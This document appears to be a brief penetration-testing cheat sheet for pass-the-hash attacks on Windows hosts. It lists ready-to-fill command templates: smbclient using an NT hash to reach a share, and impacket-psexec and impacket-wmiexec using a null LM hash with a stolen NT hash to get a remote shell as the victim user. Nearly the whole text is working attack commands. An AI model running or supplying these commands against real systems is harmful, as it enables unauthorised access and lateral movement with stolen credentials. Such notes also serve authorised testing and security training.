# PASS THE HASH
#smbclient 
```
smbclient \\\\[ip]\\secrets -U [username] --pw-nt-hash [hash]
```

#psexec
```
# PASS THE HASH

impacket-psexec -hashes 00000000000000000000000000000000:[hash] [user]@[ip]
```
`00000000000000000000000000000000:[some hash]` null value for LM part of hash when applicable 

#wmiexec
```
# gives you shell as user authenticated with

impacket-wmiexec -hashes 00000000000000000000000000000000:[hash] [user]@[ip]

/usr/bin/impacket-wmiexec -hashes :[hash] [user]@[ip]
